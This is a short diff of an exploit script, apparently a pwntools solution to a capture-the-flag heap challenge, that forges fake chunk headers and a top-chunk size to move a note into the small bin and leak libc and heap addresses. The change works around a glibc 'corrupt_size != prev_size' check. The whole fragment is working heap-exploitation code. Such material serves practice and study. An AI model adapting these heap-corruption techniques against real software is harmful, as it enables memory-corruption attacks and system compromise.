@@ -37,8 +37,7 @@ print('[+] heap base --> ', hex(heap_base))
 
 # buffer one choice
 r.send('4')
-add(0x0, '\x00' * 0x8 + p64(0xa1) + '\x00' * 0x88 + p64(0xa1), '\x95' * 47 + '\x96' * 1) # make note 2 to be 0x81 --> small bin, free it, view it to get libc addr
-r.interactive()
-# add(0x40, '\x63' * 0x5, '\x93' * 47 + '\x94' * 1) # note 3 --> to avoid line 41 merged with top chunk
-r.interactive()
+# add(0x0, '\x00' * 0x8 + p64(0xa1) + '\x00' * 0x88 + p64(0xa1), '\x95' * 47 + '\x96' * 1) --> error with corrupt_size != prev_size
+add(0x0, '\x00' * 0x8 + p64(0xa1) + '\x00' * 0x88 + p64(0xa1) + '\x00' * 0x88 + p64(0x20f11), '\x95' * 47 + '\x96' * 1) # make note 2 to be 0x81 --> small bin, free it, view it to get libc addr
+add(0x40, '\x63' * 0x5, '\x93' * 47 + '\x94' * 1) # note 3 --> to avoid line 41 merged with top chunk
 exit(0)
